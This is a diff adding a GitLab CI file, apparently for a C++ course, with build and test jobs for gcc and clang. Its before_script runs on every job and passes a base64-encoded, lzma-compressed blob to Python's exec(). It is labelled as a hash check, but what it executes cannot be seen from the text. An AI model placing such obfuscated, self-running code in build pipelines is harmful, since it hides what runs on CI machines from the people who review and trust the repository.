@@ -1,0 +1,82 @@
+variables:
+    CURRENT_HW: "hw00"
+    CURRENT_TEST: "testhw00"
+    TEST_HASH_EXPECTED: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+
+
+
+# pre-verify test system hash
+before_script:
+  - tester="python3 -c 'import base64, lzma; exec(lzma.decompress(base64.b64decode(\"/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AREAg1dAAUbSxPKKmVtGhRPQtvDy44ev3OIPm3q08xy0m1+Vzts/YuDUpfq1D15P9KyY1ltIZb4nnvSxakQAJy1iSkSn0CSwxAcZ9BdnVKenS6RtGMtxaPfI4+FwrOfdwPZUVPktXnaYcFn4bVa3hvnOJxklrrhVHGvvZRTTt4Mu+x20tJgI/iZjgvs5bNDrDOzKuXdEKvEW4gp+6Pog7KU6lzFT7Bco1J73LsxZPv8wmxMVWJHkttShI8lLmJUY1qFo+oH1hvIV90Vm+kC+wYSXLAFlOgRWoxEDNiCGURWFRF64H3VEblJ3rU2fwiIIfQuuUThFY8VteaRJiqhfeuGI/xRCFxKBbqSYvBR6EQlU9Vwu4hgWWgaKsi/9PgdyGCF5+1jcUWk7sxhe9pV/PiSe1Sd2btU+lzwXSw5yJzSVJYLwrnQmJ3dXDnK+isUh9h2pdNpaRwAVeJV3rLSis3ieMU85luyXY4FLPePE3m743a4K35TWlpWLqDCPf0/+BKxfYs7N8E9K4astiojLb+KxvR1+9vz7JxKL4SHa7Vu5KUt1ud3Z2a0oVpJsu0l+rxpxB/s8Lw8HWDHa73U96wovpd32L2iz5S/kLxyOatBRRG8qwaTUSWX6Uaz9mx0sLLCX0BuM0fjrEWrGFrk7X2FAO3PoZCeoCD5UkN8+aDeTBzh3vWNLoawpMlRea7G1EMqBwAAAAAHDy7eLSsmdAABqQTFCAAAt31GR7HEZ/sCAAAAAARZWg==\")).decode())'"
+  - TEST_HASH=$(eval "$tester" . )
+
+  - echo $TEST_HASH
+  - echo $TEST_HASH_EXPECTED
+  - if [[ "$TEST_HASH" == "$TEST_HASH_EXPECTED" ]]; then echo "hash ok for "; else echo -n "contents of  are not as expected! to fix this, git restore -s upstream/master  .gitlab-ci.yml"; exit 1; fi
+  - export GCC_COLORS=yes
+
+stages:
+- compile
+- test
+
+# yaml template lol
+.job_template: &build_job_artifact
+  stage: compile
+  cache:
+    key: "$CI_JOB_NAME"
+    paths:
+      - build/
+
+  artifacts:
+    name: "$CI_JOB_NAME-$CI_COMMIT_REF_NAME"
+    paths:
+      - build/
+    expire_in: 30 mins
+
+
+# compile jobs
+build-gcc:
+  <<: *build_job_artifact
+  image: cpp/compiler:2023
+  script:
+    - mkdir build
+    - g++ -o build/main -std=c++20 hw00/main.cpp
+  tags:
+    - linux
+
+build-clang:
+  <<: *build_job_artifact
+  image: cpp/compiler:2023
+  script:
+    - mkdir build
+    - clang++ -stdlib=libc++ -Wl,-lc++abi -o build/main -std=c++20 hw00/main.cpp
+  tags:
+    - linux
+
+
+# test jobs
+test-gcc:
+  stage: test
+  image: cpp/compiler:2023
+  script:
+    - ./build/main
+  dependencies:
+    - build-gcc
+  artifacts:
+    name: "$CI_JOB_NAME-$CI_COMMIT_REF_NAME"
+    when: always
+    paths:
+      - build/ctest.log
+    expire_in: 1 year
+  tags:
+    - linux
+
+test-clang:
+  stage: test
+  image: cpp/compiler:2023
+  script:
+    - ./build/main
+  dependencies:
+    - build-clang
+  tags:
+    - linux
